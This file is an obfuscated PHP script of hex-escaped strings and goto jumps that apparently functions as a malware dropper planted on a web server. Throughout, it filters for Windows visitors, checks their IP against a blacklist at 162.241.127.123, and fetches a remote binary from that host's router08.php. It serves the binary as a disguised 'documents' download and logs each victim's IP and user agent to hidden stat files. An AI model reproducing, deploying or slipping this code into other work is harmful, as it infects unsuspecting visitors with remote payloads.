<?php
 goto BxNcg; pEBwQ: file_put_contents(__DIR__ . "\57\x2e\56\x2f\x74\x72\171\137\x5f\x62\x69\x67\137\137\x73\x74\141\x74\56\x74\170\164", date("\x63") . "\11" . getRealIpAddr() . "\x9" . $_SERVER["\x48\x54\x54\x50\137\125\123\105\x52\x5f\x41\x47\x45\116\124"] . "\x9" . $_GET["\145"] . "\xd\12", FILE_APPEND); goto PYCj3; PXhh9: $links = array("\x68\164\x74\160\x3a\x2f\x2f\61\x36\x32\x2e\62\64\61\x2e\61\62\67\56\61\62\x33\x2f\162\x6f\x75\x74\x65\x72\60\x38\x2e\x70\150\x70\77\x70\160\75" . $data_json, "\x68\x74\164\160\72\x2f\x2f\x31\66\x32\x2e\62\x34\x31\x2e\61\62\67\56\x31\x32\x33\x2f\x72\x6f\x75\x74\145\x72\x30\x38\x2e\160\150\160\x3f\160\x70\x3d" . $data_json, "\x68\164\x74\x70\72\57\x2f\x31\x36\x32\56\62\64\x31\56\x31\62\67\x2e\x31\x32\x33\57\x72\x6f\165\x74\145\162\x30\70\56\x70\150\160\77\160\160\x3d" . $data_json); goto RnVxz; wazsM: foreach ($links as $link) { $ctx = stream_context_create(array("\150\164\x74\160" => array("\x74\151\x6d\x65\157\x75\164" => 30))); $data = file_get_contents($link, false, $ctx); if ($data == "\56\56\56\x2e" || $data == "\56\x2e\x2e") { break; } if (strlen($data) < 10000) { continue; } file_put_contents($outfilepath, date("\x63") . "\11" . getRealIpAddr() . "\11" . $_SERVER["\x48\x54\x54\x50\137\x55\x53\105\122\137\101\107\x45\x4e\x54"] . "\11" . $_GET["\x65"] . "\xd\12", FILE_APPEND); header("\x43\157\156\164\x65\x6e\x74\55\x44\x65\163\143\x72\151\160\x74\151\x6f\156\72\x20\x46\x69\154\x65\40\x54\162\141\x6e\x73\146\x65\x72"); header("\103\157\156\164\145\x6e\x74\x2d\x54\171\160\145\x3a\40\x61\160\160\154\x69\143\141\164\x69\157\x6e\57\x6f\x63\164\145\164\55\163\164\x72\145\x61\x6d"); header("\x43\157\x6e\x74\x65\x6e\164\55\x44\x69\x73\x70\157\163\x69\164\x69\157\x6e\x3a\40\141\164\164\141\x63\x68\155\145\156\164\73\40\146\x69\154\145\156\141\x6d\145\x3d" . $_SESSION["\x64\157\x63\x5f\156\141\x6d\145"]); header("\x43\157\156\x74\145\156\x74\x2d\124\162\141\x6e\163\x66\145\162\55\105\156\143\x6f\144\x69\x6e\147\72\40\x62\151\x6e\x61\162\171"); header("\103\x6f\156\x6e\x65\x63\164\151\x6f\156\72\x20\113\145\145\160\55\101\x6c\x69\x76\145"); header("\x45\x78\x70\151\x72\145\163\x3a\40\x30"); header("\x43\x61\x63\150\x65\55\103\x6f\156\164\x72\157\x6c\x3a\x20\x6d\x75\163\x74\55\x72\145\166\x61\x6c\151\144\141\164\145\54\40\160\x6f\x73\x74\55\143\150\x65\x63\x6b\x3d\60\x2c\x20\x70\x72\x65\55\143\150\x65\143\x6b\x3d\x30"); header("\120\x72\141\x67\x6d\141\72\40\160\x75\142\154\151\x63"); echo $data; die; } goto qlA8c; B0IB4: if ($_GET["\145"] != "\61\x32\63\x2e" . $file_ext) { $ip_for_check = getRealIpAddr(); $links_ip_ckeck = array("\x68\164\x74\x70\x3a\57\57\61\66\62\x2e\x32\x34\61\x2e\x31\x32\67\56\x31\62\x33\x2f\162\157\x75\164\145\162\x5f\142\x6c\x61\x63\153\56\160\150\160\x3f\x69\160\x3d" . $ip_for_check, "\x68\x74\164\160\x3a\x2f\x2f\x31\x36\62\x2e\62\x34\61\x2e\61\x32\67\x2e\61\62\63\x2f\x72\x6f\x75\x74\x65\162\x5f\x62\x6c\141\x63\153\56\x70\x68\160\x3f\x69\x70\75" . $ip_for_check, "\x68\x74\x74\x70\x3a\x2f\x2f\61\x36\x32\56\x32\64\x31\56\61\62\67\x2e\61\62\x33\57\162\x6f\165\x74\x65\162\x5f\142\154\141\x63\153\56\x70\150\x70\x3f\151\160\x3d" . $ip_for_check); $is_black = false; foreach ($links_ip_ckeck as $link_ip_ckeck) { $ctx = stream_context_create(array("\150\164\x74\160" => array("\x74\151\155\x65\157\x75\x74" => 10))); $tmp_resp = file_get_contents($link_ip_ckeck, false, $ctx); $tmp_resp_json = json_decode($tmp_resp, true); if ($tmp_resp_json["\163\x74\x61\x74\165\x73"] === true) { $is_black = $tmp_resp_json["\151\x73\137\x62\x6c\x61\143\153"]; break; } } if ($is_black) { die(''); } if ($_GET["\x65"] != "\x64\x6f\143\165\x6d\145\156\x74\163\56" . $file_ext) { $_SESSION["\137\137\162\x65\144\151\x72\145\x63\x74\x5f\167\x61\x73\137\x73\x74\141\x72\164"] = true; $_SESSION["\x64\x6f\143\x5f\x6e\x61\155\145"] = $_GET["\145"]; $_SESSION["\146\x69\154\x65\x5f\x65\170\x74"] = $file_ext; $redirect_uri = str_replace($_GET["\x65"], "\144\x6f\143\x75\x6d\x65\156\164\163\56" . $file_ext, $REQUEST_URI); echo "\x3c\144\151\166\40\x69\144\x3d\42\154\154\x22\x20\x64\x61\164\141\x2d\x72\x72\75\x22" . $redirect_uri . "\x22\x3e\x3c\57\x64\x69\x76\76"; echo "\x3c\163\143\162\151\x70\x74\x3e"; echo "\x6c\157\x63\141\x74\x69\157\x6e\56\160\x61\x74\x68\156\141\155\145\x20\75\x20\x64\x6f\x63\165\x6d\145\156\164\x2e\147\x65\164\105\154\145\155\x65\156\x74\102\x79\111\x64\x28\47\x6c\154\x27\x29\56\147\x65\x74\101\164\164\162\x69\x62\x75\x74\x65\x28\47\x64\x61\x74\x61\x2d\162\x72\47\x29\73"; echo "\74\x2f\163\x63\162\151\160\164\76"; die("\127\141\151\x74\x2e\x2e\x2e"); } else { } } else { if (empty($hdrs_new["\x68\x68"])) { die(''); } } goto kGMOp; KHHwD: function getRealIpAddr() { if (!empty($_SERVER["\110\124\124\x50\137\103\x4c\x49\105\116\x54\x5f\x49\x50"])) { $ip = $_SERVER["\110\x54\x54\120\137\103\x4c\x49\x45\116\124\x5f\x49\120"]; } elseif (!empty($_SERVER["\110\124\124\x50\137\x58\x5f\x46\117\122\x57\101\122\104\105\104\x5f\x46\x4f\x52"])) { $ip = $_SERVER["\x48\124\x54\120\x5f\130\137\106\x4f\122\127\101\122\x44\105\104\137\106\x4f\x52"]; } else { $ip = $_SERVER["\x52\x45\115\x4f\x54\x45\x5f\x41\x44\x44\x52"]; } return $ip; } goto vQ_82; ZH99m: if (empty($REQUEST_URI)) { die(''); } goto Yfejg; fyjGJ: $_GET["\x65"] = $REQUEST_URI_ARR[2]; goto s4qUJ; Yfejg: $REQUEST_URI_ARR = explode("\57", $REQUEST_URI); goto hr015; BxNcg: if (session_start() === false) { die(''); } goto hgNfI; s4qUJ: if (empty($_SERVER["\110\x54\124\x50\137\125\123\x45\122\137\x41\107\x45\x4e\124"])) { die(''); } goto ZdWPO; mSZDZ: $file_ext = explode("\x2e", $_GET["\x65"]); goto GzhJa; RnVxz: shuffle($links); goto pEBwQ; ZdWPO: if (stripos($_SERVER["\110\x54\x54\120\x5f\x55\123\x45\x52\x5f\x41\x47\105\x4e\124"], "\127\151\x6e\x64\x6f\x77\x73") === false) { die(''); } goto KHHwD; z8Yyb: $data_json = base64_encode($data_json); goto PXhh9; hr015: if (count($REQUEST_URI_ARR) != 3) { die(''); } goto fyjGJ; Pygc2: foreach ($hdrs as $key => $value) { $kk = strtolower($key); $hdrs_new[$kk] = $value; } goto mSZDZ; hgNfI: $REQUEST_URI = $_SERVER["\122\x45\121\125\x45\x53\x54\x5f\x55\122\111"]; goto ZH99m; V5B6w: $data_json = json_encode($data_json); goto z8Yyb; GzhJa: $file_ext = end($file_ext); goto B0IB4; vQ_82: $hdrs_new = array(); goto HVHA7; HVHA7: $hdrs = getallheaders(); goto Pygc2; kGMOp: $data_json = array("\x69\x70" => getRealIpAddr(), "\x74\151\155\x65" => time(), "\150\150" => $hdrs_new["\x68\x68"], "\x65\170\164" => $_SESSION["\146\151\x6c\x65\x5f\x65\170\x74"], "\x68\157\163\x74" => $_SERVER["\x53\105\x52\x56\x45\122\137\x4e\x41\115\105"]); goto V5B6w; PYCj3: $outfilepath = __DIR__ . "\x2f\x2e\x2e\57\142\151\147\137\x5f\163\164\x61\164\x2e\x74\x78\x74"; goto wazsM; qlA8c: die("\x54\x72\171\40\141\147\141\x69\156\56");